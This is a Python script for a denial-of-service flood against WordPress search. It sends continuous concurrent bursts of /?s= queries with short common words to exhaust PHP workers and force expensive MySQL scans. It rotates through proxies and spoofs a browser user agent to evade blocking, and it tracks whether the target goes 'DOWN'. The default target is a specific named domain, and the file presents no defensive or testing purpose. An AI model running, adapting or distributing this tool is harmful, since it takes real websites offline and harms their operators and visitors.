#!/usr/bin/env python3
"""
Search Flood — WordPress /?s= exhaustion
GET-based, random search terms, proxy rotation
Hits PHP workers + MySQL simultaneously

Usage:
  python3 search_flood.py
  python3 search_flood.py --target metoo-buffalo.com --concurrency 50
  python3 search_flood.py --verbose
"""

import requests, time, sys, threading, itertools, argparse, random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")

# Short common words = maximum DB row matches = most expensive LIKE '%word%' scan
SEARCH_TERMS = [
    "the","and","for","are","but","not","you","all","can","was",
    "one","our","out","day","get","has","him","his","how","its",
    "may","new","now","old","see","two","who","did","she","use",
    "her","man","big","end","put","why","let","try","say","act",
    "age","ago","air","ask","bad","bit","cut","eat","far","few",
    "got","had","hot","job","law","lay","lot","low","met","nor",
    "off","oil","per","red","run","set","sir","six","ten","top",
    "war","win","yes","yet","boy","add","buy","led","see","him",
]


# ─────────────────────────────────────────────────────────────────────────────
#  PROXY POOL
# ─────────────────────────────────────────────────────────────────────────────

class ProxyPool:
    def __init__(self, path):
        with open(path) as f:
            raw = [l.strip() for l in f if l.strip()]
        self.proxies = [
            p if p.startswith(("http","socks")) else f"http://{p}"
            for p in raw
        ]
        self._cycle = itertools.cycle(self.proxies)
        self._lock  = threading.Lock()
        self._dead  = set()
        print(f"  {G}[PROXY]{W} {len(self.proxies)} proxies loaded from {path}")

    def next(self):
        with self._lock:
            for _ in range(len(self.proxies)):
                p = next(self._cycle)
                if p not in self._dead:
                    return p
        return None

    def mark_dead(self, proxy):
        with self._lock:
            self._dead.add(proxy)

    def alive(self):
        return len(self.proxies) - len(self._dead)

    def refresh(self):
        with self._lock:
            self._dead  = set()
            self._cycle = itertools.cycle(self.proxies)
        print(f"  {Y}[PROXY]{W} Pool reset — {len(self.proxies)} back in rotation\n")


# ─────────────────────────────────────────────────────────────────────────────
#  SINGLE REQUEST
# ─────────────────────────────────────────────────────────────────────────────

def send_search(req_num, target, pool):
    proxy = pool.next()
    if not proxy:
        return req_num, 0, 0, 0, "N/A", proxy, "no proxy available"

    term = random.choice(SEARCH_TERMS)
    url  = f"https://{target}/?s={term}"

    s = requests.Session()
    s.proxies = {"http": proxy, "https": proxy}
    s.headers.update({"User-Agent": BROWSER_UA})

    t0 = time.time()
    try:
        r       = s.get(url, timeout=25)
        elapsed = time.time() - t0
        size    = len(r.content)
        cache   = r.headers.get("cf-cache-status", "N/A")
        return req_num, r.status_code, elapsed, size, cache, proxy, None
    except Exception as e:
        elapsed = time.time() - t0
        pool.mark_dead(proxy)
        return req_num, 0, elapsed, 0, "N/A", proxy, str(e)[:45]


# ─────────────────────────────────────────────────────────────────────────────
#  BURST
# ─────────────────────────────────────────────────────────────────────────────

def burst(concurrency, target, pool, verbose):
    ok = []; err = []; times = []; sizes = []
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = [ex.submit(send_search, i, target, pool) for i in range(1, concurrency+1)]
        for f in as_completed(futures):
            num, code, elapsed, size, cache, proxy, error = f.result()
            short = proxy.replace("http://","").replace("https://","")[:22] if proxy else "N/A"
            if code == 200:
                ok.append(code); times.append(elapsed); sizes.append(size)
            else:
                err.append(code)
            if verbose:
                sym    = G+"[✓]"+W if code==200 else R+"[✗]"+W
                detail = f"HTTP={code or 'ERR':<3} | Time={elapsed:.2f}s | Size={size//1024:>4}KB | Cache={cache}"
                if error: detail += f" | {error}"
                print(f"    {sym} Req {num:>3} | {short:<22} | {detail}")
    return ok, err, times, sizes


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="WordPress Search Flood — /?s= worker + DB exhaustion",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("--target",      default="metoo-buffalo.com",
                   help="Target domain (default: metoo-buffalo.com)")
    p.add_argument("--concurrency", type=int, default=50,
                   help="Concurrent requests per burst (default: 50)")
    p.add_argument("--proxy-file",  default=PROXY_FILE,
                   help=f"Path to proxy list (default: {PROXY_FILE})")
    p.add_argument("--verbose",     action="store_true",
                   help="Show every request")
    p.add_argument("--delay",       type=float, default=0,
                   help="Seconds between bursts (default: 0)")
    args = p.parse_args()

    target = args.target.replace("https://","").replace("http://","").strip("/")

    try:
        pool = ProxyPool(args.proxy_file)
    except FileNotFoundError:
        print(f"\n  {R}[ERROR]{W} Proxy file not found: {args.proxy_file}")
        sys.exit(1)

    print(f"""
{B}{'='*66}{W}
  Search Flood — WordPress /?s= Exhaustion
{B}{'='*66}{W}
  Target      : https://{target}/?s=<random_word>
  Concurrency : {args.concurrency} per burst
  Proxies     : {pool.alive()} alive — rotating per request
  Search terms: {len(SEARCH_TERMS)} common words (new term each request)
  Attack path : PHP workers + MySQL LIKE scan simultaneously
  Mode        : Continuous until Ctrl+C
{B}{'='*66}{W}
""")

    total_ok  = 0; total_err = 0; burst_num = 0
    all_times = []; all_sizes = []
    start = time.time()

    try:
        while True:
            burst_num += 1
            ts = datetime.now().strftime("%H:%M:%S")

            if not args.verbose:
                print(f"  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"alive={pool.alive()} | sending {args.concurrency}...",
                      end="", flush=True)

            ok, err, times, sizes = burst(args.concurrency, target, pool, args.verbose)

            total_ok  += len(ok)
            total_err += len(err)
            all_times += times
            all_sizes += sizes

            avail  = len(ok) / args.concurrency * 100
            avg_t  = sum(times)/len(times) if times else 0
            avg_kb = sum(sizes)/len(sizes)/1024 if sizes else 0
            run_t  = time.time() - start

            if avail >= 80:   status = G+"STABLE"+W
            elif avail >= 30: status = Y+"DEGRADED"+W
            else:             status = R+"DOWN"+W

            if not args.verbose:
                print(f"\r  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"OK={len(ok)}/{args.concurrency} | "
                      f"Avail={avail:>5.1f}% | "
                      f"Avg={avg_t:.2f}s | "
                      f"AvgSize={avg_kb:.0f}KB | "
                      f"Status={status} | "
                      f"Runtime={run_t:.0f}s")
            else:
                print(f"\n  {C}[Burst {burst_num}]{W} OK={len(ok)}/{args.concurrency} | "
                      f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | "
                      f"AvgSize={avg_kb:.0f}KB | {status}\n")

            if pool.alive() == 0:
                pool.refresh()

            if args.delay > 0:
                time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C received.\n")

    # ── final report ──────────────────────────────────────────────────────────
    runtime = time.time() - start
    total   = total_ok + total_err

    print(f"{B}{'='*66}{W}")
    print(f"  FINAL REPORT — Search Flood")
    print(f"{B}{'='*66}{W}")
    print(f"  Target        : https://{target}/?s=<term>")
    print(f"  Runtime       : {runtime:.0f}s")
    print(f"  Bursts        : {burst_num}")
    print(f"  Total requests: {total}")
    if total:
        print(f"  200 OK        : {total_ok} ({total_ok/total*100:.1f}%)")
        print(f"  Errors        : {total_err} ({total_err/total*100:.1f}%)")
    if all_times:
        print(f"  Avg resp time : {sum(all_times)/len(all_times):.2f}s")
        print(f"  Max resp time : {max(all_times):.2f}s")
    if all_sizes:
        print(f"  Avg resp size : {sum(all_sizes)/len(all_sizes)/1024:.0f} KB")
        print(f"  Max resp size : {max(all_sizes)/1024:.0f} KB")
    print(f"  Proxies dead  : {len(pool._dead)}/{len(pool.proxies)}")
    if runtime > 0:
        print(f"  RPS           : {total/runtime:.2f}")
    print(f"{B}{'='*66}{W}\n")


if __name__ == "__main__":
    main()
